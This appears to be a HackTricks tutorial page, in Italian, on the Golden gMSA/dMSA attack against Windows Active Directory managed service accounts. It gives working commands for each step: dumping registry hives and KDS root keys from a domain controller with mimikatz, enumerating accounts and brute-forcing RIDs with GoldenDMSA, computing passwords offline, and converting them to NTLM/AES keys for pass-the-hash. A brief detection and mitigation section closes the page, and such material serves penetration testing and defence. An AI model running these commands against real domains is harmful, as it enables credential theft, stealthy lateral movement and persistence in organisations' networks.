# Golden gMSA/dMSA Attack (Derivazione Offline delle Password degli Account di Servizio Gestiti)

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Gli Account di Servizio Gestiti di Windows (MSA) sono principi speciali progettati per eseguire servizi senza la necessità di gestire manualmente le loro password.
Ci sono due varianti principali:

1. **gMSA** – account di servizio gestito di gruppo – può essere utilizzato su più host autorizzati nel suo attributo `msDS-GroupMSAMembership`.
2. **dMSA** – account di servizio gestito delegato – il successore (in anteprima) del gMSA, che si basa sulla stessa crittografia ma consente scenari di delega più granulari.

Per entrambe le varianti, la **password non è memorizzata** su ciascun Domain Controller (DC) come un normale NT-hash. Invece, ogni DC può **derivare** la password attuale al volo da:

* La **KDS Root Key** a livello di foresta (`KRBTGT\KDS`) – segreto con nome GUID generato casualmente, replicato a ogni DC sotto il contenitore `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* Il **SID** dell'account target.
* Un **ManagedPasswordID** (GUID) per account trovato nell'attributo `msDS-ManagedPasswordId`.

La derivazione è: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob di 240 byte infine **base64-encoded** e memorizzato nell'attributo `msDS-ManagedPassword`.
Nessun traffico Kerberos o interazione con il dominio è richiesta durante l'uso normale della password – un host membro deriva la password localmente finché conosce i tre input.

## Golden gMSA / Golden dMSA Attack

Se un attaccante può ottenere tutti e tre gli input **offline**, può calcolare **password valide attuali e future** per **qualsiasi gMSA/dMSA nella foresta** senza toccare di nuovo il DC, bypassando:

* Registri di pre-autenticazione Kerberos / richiesta di ticket
* Audit di lettura LDAP
* Intervalli di cambio password (possono pre-calcolare)

Questo è analogo a un *Golden Ticket* per gli account di servizio.

### Requisiti

1. **Compromissione a livello di foresta** di **un DC** (o Amministratore di Impresa). L'accesso `SYSTEM` è sufficiente.
2. Capacità di enumerare gli account di servizio (lettura LDAP / brute-force RID).
3. Workstation .NET ≥ 4.7.2 x64 per eseguire [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) o codice equivalente.

### Fase 1 – Estrai la KDS Root Key

Dump da qualsiasi DC (Volume Shadow Copy / hives SAM+SECURITY raw o segreti remoti):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
La stringa base64 etichettata `RootKey` (nome GUID) è necessaria nei passaggi successivi.

### Fase 2 – Enumerare gli oggetti gMSA/dMSA

Recupera almeno `sAMAccountName`, `objectSid` e `msDS-ManagedPasswordId`:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementa modalità di aiuto:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### Fase 3 – Indovina / Scopri il ManagedPasswordID (quando mancante)

Alcuni deployment *rimuovono* `msDS-ManagedPasswordId` da letture protette da ACL.  
Poiché il GUID è a 128 bit, il bruteforce ingenuo è impraticabile, ma:

1. I primi **32 bit = tempo epoch Unix** della creazione dell'account (risoluzione in minuti).  
2. Seguiti da 96 bit casuali.

Pertanto, una **lista di parole ristretta per account** (± poche ore) è realistica.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Lo strumento calcola le password candidate e confronta il loro blob base64 con il reale attributo `msDS-ManagedPassword` – la corrispondenza rivela il GUID corretto.

### Fase 4 – Computazione e Conversione della Password Offline

Una volta conosciuto il ManagedPasswordID, la password valida è a un comando di distanza:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
Le hash risultanti possono essere iniettati con **mimikatz** (`sekurlsa::pth`) o **Rubeus** per l'abuso di Kerberos, abilitando un **movimento laterale** furtivo e **persistenza**.

## Rilevamento e Mitigazione

* Limitare le capacità di **backup DC e lettura del registro** agli amministratori di Tier-0.
* Monitorare la creazione della **Modalità di Ripristino dei Servizi di Directory (DSRM)** o della **Copia Shadow del Volume** sui DC.
* Audit delle letture / modifiche a `CN=Master Root Keys,…` e ai flag `userAccountControl` degli account di servizio.
* Rilevare scritture di password **base64** insolite o riutilizzo improvviso di password di servizio tra host.
* Considerare la conversione di gMSA ad alto privilegio in **account di servizio classici** con rotazioni casuali regolari dove l'isolamento di Tier-0 non è possibile.

## Strumenti

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementazione di riferimento utilizzata in questa pagina.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket utilizzando chiavi AES derivate.

## Riferimenti

- [Golden dMSA – bypass dell'autenticazione per gli Account di Servizio Gestiti Delegati](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Repository GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)
- [Improsec – attacco di fiducia Golden gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
